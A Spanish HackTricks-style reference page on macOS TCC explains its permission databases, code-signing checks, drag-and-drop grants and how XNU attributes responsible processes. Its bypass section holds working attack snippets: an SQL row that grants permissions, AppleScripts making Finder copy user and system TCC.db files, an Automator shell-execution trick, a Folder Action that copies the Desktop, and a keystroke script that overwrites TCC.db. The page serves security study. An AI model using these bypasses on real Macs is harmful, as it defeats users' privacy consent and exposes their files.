# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Información básica**

**TCC (Transparency, Consent, and Control)** es un protocolo de seguridad centrado en regular los permisos de las aplicaciones. Su función principal es proteger funciones sensibles como **los servicios de ubicación, los contactos, las fotos, el micrófono, la cámara, la accesibilidad y el acceso total al disco**. Al exigir el consentimiento explícito del usuario antes de conceder a las aplicaciones acceso a estos elementos, TCC mejora la privacidad y el control de los usuarios sobre sus datos.

Los usuarios se encuentran con TCC cuando las aplicaciones solicitan acceso a funciones protegidas. Esto se muestra mediante un aviso que permite a los usuarios **aprobar o denegar el acceso**. Además, TCC admite acciones directas del usuario, como **arrastrar y soltar archivos en una aplicación**, para conceder acceso a archivos específicos y garantizar que las aplicaciones solo tengan acceso a lo que se permite explícitamente.

![Un ejemplo de aviso de TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** está gestionado por el **daemon** ubicado en `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` y configurado en `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (que registra el servicio mach `com.apple.tccd.system`).

Hay un **tccd en modo de usuario** que se ejecuta para cada usuario con sesión iniciada, definido en `/System/Library/LaunchAgents/com.apple.tccd.plist`, y que registra los servicios mach `com.apple.tccd` y `com.apple.usernotifications.delegate.com.apple.tccd`.

Aquí puedes ver el tccd ejecutándose como sistema y como usuario:

```bash
ps -ef | grep tcc
    0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
  501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```

Los permisos se **heredan de la aplicación principal** y se **registran** según el **Bundle ID** y el **Developer ID**.

### Bases de datos de TCC

Los permisos concedidos o denegados se almacenan en algunas bases de datos de TCC:

- La base de datos de todo el sistema en **`/Library/Application Support/com.apple.TCC/TCC.db`**.
  - Esta base de datos está **protegida por SIP**, por lo que solo un bypass de SIP puede escribir en ella.
- La base de datos de TCC del usuario **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**, que almacena las preferencias de cada usuario.
  - Esta base de datos está protegida, por lo que solo los procesos con privilegios elevados de TCC, como Full Disk Access, pueden escribir en ella (pero no está protegida por SIP).

> [!WARNING]
> Las bases de datos anteriores también están **protegidas por TCC contra el acceso de lectura**. Por tanto, **no podrás leer** la base de datos de TCC de tu usuario habitual a menos que lo hagas desde un proceso con privilegios de TCC.
>
> Sin embargo, recuerda que un proceso con estos privilegios elevados (como **FDA** o **`kTCCServiceEndpointSecurityClient`**) podrá escribir en la base de datos de TCC del usuario.

- Hay una **tercera** base de datos de TCC en **`/var/db/locationd/clients.plist`**, que indica qué clientes tienen permiso para **acceder a los servicios de ubicación**.
- **`/Library/Application Support/com.apple.TCC/REG.db`** registra las rutas de las bases de datos de TCC registradas. Una base de datos de usuario colocada en el sistema puede ser rechazada si no está registrada; conocer esta ruta por sí solo no concede acceso a ninguna de las dos bases de datos.<sup>[[6]](#references)</sup>
- **`/Library/Application Support/com.apple.TCC/MDMOverrides.plist`** contiene las decisiones administradas de Privacy Preferences Policy Control (PPPC). Revísalo cuando una aplicación tenga un permiso concedido por la administración que no aparezca en las filas `access` habituales.<sup>[[7]](#references)</sup>
- El archivo protegido por SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (pero legible por cualquiera) es una lista de aplicaciones permitidas que requieren una excepción de TCC.

> [!TIP]
> La base de datos de TCC en **iOS** está en **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> La **interfaz del centro de notificaciones** puede realizar **cambios en la base de datos de TCC del sistema**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Sin embargo, los usuarios pueden **restablecer reglas** con la utilidad de línea de comandos **`tccutil`**; no tiene ninguna operación de consulta documentada.<sup>[[4]](#references)</sup>

#### Consultar las bases de datos

{{#tabs}}
{{#tab name="user DB"}}

```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}

{{#tab name="system DB"}}

```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}
{{#endtabs}}

> [!TIP]
> Al revisar ambas bases de datos, puedes comprobar los permisos que una app ha permitido, ha denegado o no tiene (te los solicitará).

- **`service`** es la representación en forma de cadena del **permiso** de TCC
- **`client`** es el **bundle ID** o la **ruta al binario** que tiene los permisos
- **`client_type`** indica si es un Bundle Identifier(0) o una ruta absoluta(1)

<details>

<summary>Cómo ejecutarlo si es una ruta absoluta</summary>

Solo ejecuta **`launctl load you_bin.plist`**, con un plist como este:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Label for the job -->
    <key>Label</key>
    <string>com.example.yourbinary</string>

    <!-- The path to the executable -->
    <key>Program</key>
    <string>/path/to/binary</string>

    <!-- Arguments to pass to the executable (if any) -->
    <key>ProgramArguments</key>
    <array>
        <string>arg1</string>
        <string>arg2</string>
    </array>

    <!-- Run at load -->
    <key>RunAtLoad</key>
    <true/>

    <!-- Keep the job alive, restart if necessary -->
    <key>KeepAlive</key>
    <true/>

    <!-- Standard output and error paths (optional) -->
    <key>StandardOutPath</key>
    <string>/tmp/YourBinary.stdout</string>
    <key>StandardErrorPath</key>
    <string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```

</details>

- **`auth_value`** puede tener distintos valores: denied(0), unknown(1), allowed(2) o limited(3).
- **`auth_reason`** puede tomar los siguientes valores: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- El campo **csreq** indica cómo verificar el binario que se va a ejecutar y conceder los permisos de TCC:

```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```

- Para obtener más información sobre los **otros campos** de la tabla, [**consulta esta entrada del blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

También puedes consultar los permisos **ya concedidos** a las apps en `Preferencias del Sistema --> Seguridad y privacidad --> Privacidad --> Archivos y carpetas`.

> [!TIP]
> Los usuarios pueden **restablecer** las reglas con **`tccutil`**, pero deben inspeccionar las bases de datos para consultar las concesiones.<sup>[[4]](#references)</sup>

#### Restablecer permisos de TCC

```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```

#### Identificar los permisos del emisor y el destino de Apple Events

Un permiso de Automation es una decisión **del emisor al destino**, no un permiso para controlar todas las apps. Si tienes acceso a la base de datos del usuario, enumera los pares de emisor y destino permitidos antes de probar los flujos de trabajo de [Apple Events](macos-apple-events.md) o Finder que se indican a continuación. `csreq` identifica al emisor e `indirect_object_code_identity` identifica al destino; decodifica cualquiera de los blobs no nulos con el método `csreq` anterior.<sup>[[1]](#references)</sup>

```bash
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
  "SELECT client, indirect_object_identifier AS target, \
          hex(csreq) AS sender_req, \
          hex(indirect_object_code_identity) AS target_req \
   FROM access WHERE service='kTCCServiceAppleEvents' AND auth_value=2;"
```

### Comprobaciones de firma de TCC

La **base de datos** de TCC almacena el **Bundle ID** de la aplicación, pero también **guarda** **información** sobre la **firma** para **asegurarse** de que la aplicación que solicita usar un permiso sea la correcta.

```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```

> [!WARNING]
> Por lo tanto, otras aplicaciones que usen el mismo nombre y bundle ID no podrán acceder a los permisos concedidos a otras aplicaciones.

### Entitlements y permisos de TCC

Una concesión de TCC no anula las restricciones de **App Sandbox**. Un cliente de cámara en sandbox necesita `com.apple.security.device.camera`; Apple también ofrece esta capacidad a las aplicaciones con Hardened Runtime. Ningún entitlement evita el aviso de consentimiento independiente que se muestra al usuario. No consideres el entitlement de sandbox un requisito incondicional para todos los procesos que no estén en sandbox. Si una solicitud falla, comprueba tanto los entitlements del ejecutable como la aplicación responsable.<sup>[[8]](#references)[[9]](#references)</sup>

Ten en cuenta que los entitlements son archivos plist y forman parte de code sig; además, code sig los vuelve a hashear en slots especiales. El código del kernel puede consultarlos en el kernel, y el código de modo usuario puede hacerlo mediante `csops(#169)` o `csops_audittoken(#170)`.

Sin embargo, para **acceder** a **ciertas carpetas del usuario**, como `~/Desktop`, `~/Downloads` y `~/Documents`, las aplicaciones **no necesitan** ningún **entitlement** específico. El sistema gestionará el acceso de forma transparente y **solicitará permiso al usuario** cuando sea necesario.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Las aplicaciones de Apple **no generan avisos**. Incluyen **permisos preconcedidos** en su lista de **entitlements**, lo que significa que **nunca mostrarán una ventana emergente** y **tampoco** aparecerán en ninguna de las **bases de datos de TCC**. Por ejemplo:

```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
    <string>kTCCServiceReminders</string>
    <string>kTCCServiceCalendar</string>
    <string>kTCCServiceAddressBook</string>
</array>
```

Esto evitará que Calendar solicite al usuario acceso a Reminders, Calendar y la libreta de direcciones.

> [!TIP]
> Además de cierta documentación oficial sobre entitlements, también es posible encontrar **información interesante no oficial sobre entitlements en** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Algunos permisos de TCC son: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... No hay una lista pública que los defina todos, pero puedes consultar esta [**lista de permisos conocidos**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).<sup>[[1]](#references)</sup>

### Lugares sensibles no protegidos

- $HOME (en sí)
- $HOME/.ssh, $HOME/.aws, etc.
- /tmp

### Intención del usuario / com.apple.macl

Como se mencionó anteriormente, es posible **dar acceso a una app a un archivo arrastrándolo y soltándolo en ella**. Este acceso no se especificará en ninguna base de datos de TCC, sino como un **atributo extendido** **del archivo**. Este atributo **almacenará el UUID** de la app autorizada:<sup>[[2]](#references)</sup>

```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
    uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```

> [!TIP]
> Es curioso que el atributo **`com.apple.macl`** esté gestionado por **Sandbox**, no por tccd.
>
> Ten en cuenta también que, si mueves a otro ordenador un archivo que permite el acceso al UUID de una app de tu ordenador, no le concederá acceso a esa app, porque la misma app tendrá distintos UID.

El atributo extendido `com.apple.macl` **no se puede borrar** como otros atributos extendidos porque está **protegido por SIP**. Sin embargo, como [**se explica en esta publicación**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), es posible desactivarlo **comprimiendo** el archivo, **borrándolo** y **descomprimiéndolo**.<sup>[[3]](#references)</sup>






## Mecanismo de procesos responsables de XNU

En macOS/iOS, el mecanismo de **proceso responsable** es una función de seguridad fundamental que utiliza el framework **TCC (Transparency, Consent, and Control)** y otros sistemas de seguridad para rastrear qué proceso es, en última instancia, responsable de una acción, incluso a través de cadenas de procesos secundarios.

Cuando TCC comprueba los permisos (por ejemplo, de cámara, micrófono o ubicación), no siempre comprueba el proceso que realiza la solicitud directamente. En su lugar, comprueba el **proceso responsable**, normalmente la aplicación con interfaz gráfica que inició la acción, aunque la solicitud real provenga de un proceso auxiliar o un daemon.

Para identificar la app que realmente se atribuye a una solicitud, transmite los mensajes `AttributionChain` de TCC mientras activas la operación protegida. Esto es más fiable que conceder acceso al ejecutable auxiliar solo porque realizó la llamada a la API. Compara la identidad indicada con el ID del bundle o la ruta y el requisito de firma de la fila `access` pertinente.<sup>[[10]](#references)</sup>

```bash
log stream --debug --predicate 'subsystem == "com.apple.TCC" AND eventMessage BEGINSWITH "AttributionChain"'
```

<details>
<summary>Cómo se establece el proceso responsable</summary>

### Campos de la estructura del proceso

Cada proceso en XNU mantiene dos identificadores UUID clave:

```c
// From bsd/sys/proc_internal.h
struct proc {
    // ...
    pid_t   p_responsible_pid;          // PID of the responsible process
    uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
    uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
    // ...
};
```

- **`p_uuid`**: UUID propio del proceso (del comando de carga `LC_UUID` de su binario Mach-O)
- **`p_responsible_pid`**: PID del proceso responsable
- **`p_responsible_uuid`**: UUID del proceso responsable (persiste incluso después de que ese proceso finalice)

### Cómo se establece el proceso responsable

1. **Durante la creación del proceso (Fork)**

Cuando se crea un proceso nuevo mediante `fork()` o `posix_spawn()`, hereda el proceso responsable del proceso padre (la llamada al sistema `exec()` reutiliza la estructura `proc` existente, por lo que este paso no se repite):

**Ubicación**: `bsd/kern/kern_fork.c:1053`

```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```

**Puntos clave:**
- Los procesos hijo **heredan** el `p_responsible_pid` del padre
- Esto crea una **cadena de responsabilidad** a través de la jerarquía de procesos
- El proceso responsable normalmente apunta a la aplicación GUI original

2. **La función principal: `proc_set_responsible_pid()`**

**Ubicación**: `bsd/kern/kern_proc.c:4817-4831`

```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
    target_proc->p_responsible_pid = responsible_pid;
    
    if (responsible_pid >= 0) {
        proc_t responsible_proc = proc_find(responsible_pid);
        if (responsible_proc != PROC_NULL) {
            // Copy the responsible process's UUID for persistent identification
            proc_getexecutableuuid(responsible_proc, 
                target_proc->p_responsible_uuid, 
                sizeof(target_proc->p_responsible_uuid));
            proc_rele(responsible_proc);
        }
    }
    return;
}
```

**Qué hace esta función:**
1. **Establece el PID responsable** en el proceso objetivo
2. **Busca el proceso responsable** usando `proc_find()` (incrementa el contador de referencias)
3. **Copia el UUID** de `p_uuid` del proceso responsable a `p_responsible_uuid` del proceso objetivo
4. **Libera la referencia** con `proc_rele()` (decrementa el contador de referencias)

3. **¿Por qué almacenar tanto el PID como el UUID?**

El enfoque de almacenamiento dual resuelve un problema crítico:

| Campo | Propósito | Problema | Solución |
|-------|-----------|----------|----------|
| `p_responsible_pid` | Búsqueda rápida del proceso actual | El PID puede reutilizarse cuando el proceso termina | Se usa para buscar procesos activos |
| `p_responsible_uuid` | Identificación persistente | Persiste tras la terminación del proceso | Se usa para comprobaciones de seguridad y auditoría |

**El problema**: Si el proceso responsable termina antes que el proceso hijo, el PID podría reciclarse y asignarse a un proceso completamente distinto.

**La solución**: El UUID es inmutable e identifica de forma única el binario específico que era responsable, incluso después de que termine.

### Flujo de creación de procesos

```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │ fork() / posix_spawn()
                      ▼
         ┌────────────────────────────┐
         │ kern_fork.c:fork1_internal │
         │                            │
         │ proc_set_responsible_pid(  │
         │   child_proc,              │
         │   parent->p_responsible_pid│
         │ );                         │
         └────────────┬───────────────┘
                      │
                      ▼
         ┌────────────────────────────┐
         │ proc_set_responsible_pid() │
         │                            │
         │ 1. Set p_responsible_pid   │
         │ 2. Find responsible proc   │
         │ 3. Copy UUID               │
         │ 4. Release reference       │
         └────────────┬───────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```

### Origen del UUID: comando de carga LC_UUID

El UUID almacenado en `p_uuid` proviene del **comando de carga `LC_UUID` del ejecutable Mach-O**:

1. **Tiempo de compilación**

```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```

2. **Tiempo de ejecución**

**Ubicación**: `bsd/kern/mach_loader.c:2393-2413`

```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
    if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
        (((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
        return LOAD_BADMACHO;
    }

    // Extract UUID from LC_UUID load command
    memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
    return LOAD_SUCCESS;
}
```

3. **Almacenado en la estructura del proceso**

**Ubicación**: `bsd/kern/kern_exec.c:2281`

```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```

**Location**: `bsd/kern/kern_proc.c:1912-1915`

```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
    memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### Insertar en TCC

Si en algún momento consigues acceso de escritura a una base de datos de TCC, puedes usar algo como lo siguiente para añadir una entrada (elimina los comentarios):

<details>

<summary>Ejemplo de inserción en TCC</summary>

```sql
INSERT INTO access (
    service,
    client,
    client_type,
    auth_value,
    auth_reason,
    auth_version,
    csreq,
    policy_id,
    indirect_object_identifier_type,
    indirect_object_identifier,
    indirect_object_code_identity,
    flags,
    last_modified,
    pid,
    pid_version,
    boot_uuid,
    last_reminded
) VALUES (
    'kTCCServiceSystemPolicyDesktopFolder', -- service
    'com.googlecode.iterm2', -- client
    0, -- client_type (0 - bundle id)
    2, -- auth_value  (2 - allowed)
    3, -- auth_reason (3 - "User Set")
    1, -- auth_version (always 1)
    X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
    NULL, -- policy_id
    NULL, -- indirect_object_identifier_type
    'UNUSED', -- indirect_object_identifier - default value
    NULL, -- indirect_object_code_identity
    0, -- flags
    strftime('%s', 'now'), -- last_modified with default current timestamp
    NULL, -- assuming pid is an integer and optional
    NULL, -- assuming pid_version is an integer and optional
    'UNUSED', -- default value for boot_uuid
    strftime('%s', 'now') -- last_reminded with default current timestamp
);
```

</details>

### TCC Payloads

Si conseguiste entrar en una app con algunos permisos de TCC, consulta la siguiente página sobre TCC payloads para abusar de ellos:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Aprende sobre Apple Events en:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) a FDA\*

El nombre TCC del permiso Automation es: **`kTCCServiceAppleEvents`**\
Este permiso TCC específico también indica la **aplicación que se puede administrar** dentro de la base de datos TCC (por lo que los permisos no permiten administrar cualquier cosa).

**Finder** es una aplicación que **siempre tiene FDA** (aunque no aparezca en la interfaz de usuario), así que, si tienes privilegios de **Automation** sobre ella, puedes abusar de sus privilegios para **hacer que realice algunas acciones**.\
En este caso, tu app necesitaría el permiso **`kTCCServiceAppleEvents`** sobre **`com.apple.Finder`**.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}

```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
    set homeFolder to path to home folder as string
    set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}

{{#tab name="Steal systems TCC.db"}}

```applescript
osascript<<EOD
tell application "Finder"
    set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}
{{#endtabs}}

Una variante de escritura reportada, cuando se dispone de una ruta de Automation a Finder, consiste en hacer que Finder **cambie el nombre del directorio `com.apple.TCC` del usuario**. Luego, la base de datos de la ruta renombrada se copiaba a un directorio de preparación, se modificaba allí, se volvía a copiar y se restauraba el nombre del directorio. La nueva fila `kTCCServiceAppleEvents` debe identificar **tanto el binario emisor como Finder**, incluidos sus requisitos de código; conceder permiso a un emisor sin la identidad del destino no es equivalente. Esta técnica depende de la ruta, así que verifícala en la versión de macOS objetivo en lugar de asumir que Automation de Finder por sí sola permite escribir arbitrariamente en la base de datos.<sup>[[11]](#references)</sup>

> [!WARNING]
> Con este permiso podrás **pedirle a Finder que acceda a carpetas restringidas por TCC** y te entregue los archivos, pero, que yo sepa, **no podrás hacer que Finder ejecute código arbitrario** para abusar por completo de su acceso FDA.
>
> Por lo tanto, no podrás abusar de todas las capacidades de FDA.

Este es el aviso de TCC para obtener privilegios de Automation sobre Finder:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Ten en cuenta que, como la aplicación **Automator** tiene el permiso TCC **`kTCCServiceAppleEvents`**, puede **controlar cualquier aplicación**, como Finder. Por lo tanto, si tienes permiso para controlar Automator, también podrías controlar **Finder** con un código como el siguiente:

<details>

<summary>Obtener un shell dentro de Automator</summary>

```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
   set actionID to Automator action id "com.apple.RunShellScript"
   tell (make new workflow)
      add actionID to it
      tell last Automator action
         set value of setting "inputMethod" to 1
         set value of setting "COMMAND_STRING" to theScript
      end tell
      execute it
   end tell
   activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```

</details>

Lo mismo ocurre con la **app Script Editor**, que puede controlar Finder, pero mediante un AppleScript no puedes obligarla a ejecutar un script.

### Automatización (SE) para algunas ubicaciones de TCC

**System Events puede crear acciones de carpeta, y las acciones de carpeta pueden acceder a algunas carpetas de TCC** (Escritorio, Documentos y Descargas), así que se puede usar un script como el siguiente para abusar de este comportamiento:

```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
    -- Ensure Folder Actions are enabled
    set folder actions enabled to true

    -- Define the path to the folder and the script
    set homeFolder to path to home folder as text
    set folderPath to homeFolder & "Desktop"
    set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

    -- Create or get the Folder Action for the Desktop
    if not (exists folder action folderPath) then
        make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
    end if
    set myFolderAction to folder action folderPath

    -- Attach the script to the Folder Action
    if not (exists script scriptPath of myFolderAction) then
        make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
    end if

    -- Enable the Folder Action and the script
    enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```

### Automatización (SE) + Accesibilidad (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**) para FDA*

La automatización de **`System Events`** + Accesibilidad (**`kTCCServicePostEvent`**) permite enviar **pulsaciones de teclas a procesos**. De esta forma, se podría abusar de Finder para modificar el TCC.db del usuario o conceder FDA a una aplicación arbitraria (aunque podría solicitarse la contraseña).

Ejemplo de Finder sobrescribiendo el TCC.db del usuario:

```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
    -- Open Finder
    tell application "Finder" to activate

    -- Open the /tmp directory
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke "/tmp"
    delay 1
    keystroke return
    delay 1

    -- Select and copy the file
    keystroke "TCC.db"
    delay 1
    keystroke "c" using {command down}
    delay 1

    -- Resolve $HOME environment variable
    set homePath to system attribute "HOME"

    -- Navigate to the Desktop directory under $HOME
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke homePath & "/Library/Application Support/com.apple.TCC"
    delay 1
    keystroke return
    delay 1

    -- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
    keystroke "TCC.db"
    delay 1
    keystroke return
    delay 1
    key code 51 using {command down}
    delay 1

    -- Paste the file
    keystroke "v" using {command down}
end tell
EOF
```

### `kTCCServiceAccessibility` a FDA\*

Consulta esta página para ver algunos [**payloads para abusar de los permisos de Accessibility**](macos-tcc-payloads.md#accessibility) y escalar privilegios a FDA\* o ejecutar un keylogger, por ejemplo.

### **Endpoint Security Client a FDA**

Si tienes **`kTCCServiceEndpointSecurityClient`**, tienes FDA. Fin.

### System Policy SysAdmin File a FDA

**`kTCCServiceSystemPolicySysAdminFiles`** permite **cambiar** el atributo **`NFSHomeDirectory`** de un usuario, lo que cambia su carpeta de inicio y, por lo tanto, permite **omitir TCC**.<sup>[[5]](#references)</sup>

### Base de datos TCC del usuario a FDA

Si obtienes **permisos de escritura** sobre la base de datos **TCC del usuario**, **no puedes** concederte permisos de **`FDA`**; solo puede hacerlo la base de datos del sistema.

Pero sí puedes concederte **derechos de Automation para Finder** y abusar de la técnica anterior para escalar a FDA\*.

### **FDA a permisos TCC**

El nombre TCC de **Full Disk Access** es **`kTCCServiceSystemPolicyAllFiles`**.

No creo que esto sea una escalada de privilegios real, pero por si te resulta útil: si controlas un programa con FDA, puedes **modificar la base de datos TCC de los usuarios y concederte cualquier acceso**. Esto puede ser útil como técnica de persistencia por si pierdes tus permisos de FDA.

### **SIP Bypass para omitir TCC**

La **base de datos TCC** del sistema está protegida por **SIP**; por eso, solo los procesos con los **entitlements indicados pueden modificarla**. Por lo tanto, si un atacante encuentra un **SIP bypass** para un **archivo** (es decir, puede modificar un archivo restringido por SIP), podrá:

- **Eliminar la protección** de una base de datos TCC y concederse todos los permisos TCC. Por ejemplo, podría abusar de cualquiera de estos archivos:
  - La base de datos TCC del sistema
  - REG.db
  - MDMOverrides.plist

